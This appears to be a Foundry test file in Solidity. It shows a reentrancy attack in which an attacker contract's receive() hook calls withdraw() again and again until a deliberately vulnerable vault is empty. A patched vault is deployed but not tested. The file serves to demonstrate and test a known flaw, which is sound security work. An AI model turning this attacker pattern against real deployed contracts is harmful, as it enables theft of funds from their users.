// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../contracts/VulnerableVault.sol";
import "../contracts/PatchedVault.sol";

contract ReentrancyAttacker {
    VulnerableVault private immutable vault;

    constructor(VulnerableVault target) {
        vault = target;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) vault.withdraw();
    }
}

contract ReentrancyTest is Test {
    VulnerableVault private vulnerable;
    PatchedVault private patched;

    function setUp() external {
        vulnerable = new VulnerableVault();
        patched = new PatchedVault();
        vm.deal(address(this), 20 ether);
        vulnerable.deposit{value: 10 ether}();
        patched.deposit{value: 10 ether}();
    }

    function testVulnerableVaultCanBeDrained() external {
        ReentrancyAttacker attacker = new ReentrancyAttacker(vulnerable);
        vm.deal(address(attacker), 1 ether);
        attacker.attack{value: 1 ether}();
        assertEq(address(vulnerable).balance, 0);
    }
}
